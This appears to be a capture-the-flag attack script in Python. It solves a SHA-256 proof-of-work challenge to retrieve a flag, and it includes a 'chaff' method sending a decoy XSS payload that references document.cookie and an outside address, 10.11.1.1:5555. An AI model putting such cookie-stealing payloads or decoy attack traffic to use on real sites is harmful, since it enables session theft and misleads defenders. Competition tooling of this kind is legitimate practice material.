#!/usr/bin/env python3

from socket import *
from Exploit import Exploit
from hashlib import sha256
from binascii import b2a_hex
from os import urandom

class Sha256_Response_Exploit(Exploit):
    def __init__(self, ip, port, name="", debug=False, debug_chaff=False):
        super().__init__(ip, port, name, debug, debug_chaff)


    def launch_exploit(self):
        recv_msg = self.recv_until('\n')
        hex_string = recv_msg.split(':',1)[1].strip()
        sha_string = "".encode('utf-8')
        while sha256(sha_string).hexdigest()[:4] != hex_string:
            sha_string = b2a_hex(urandom(10))
        sha_string = sha_string.decode('utf-8')
        #self.dprint("Found matching string: {}".format(sha_string))
        self.send(sha_string+'\n', self.sock)
        flag = self.recv_until('\n').split(': ',1)[1].strip()
        return flag


    def launch_chaff(self):
        #This is where you would write a fake exploit that does not really
        #work, but looks real enough to cause them to waste time looking for
        #the real exploit.
        recv_msg = self.recv_until('\n')
        self.send("<script><img src='http://10.11.1.1:5555'+document.write(document.cookie)></script>"+'\n', self.sock)
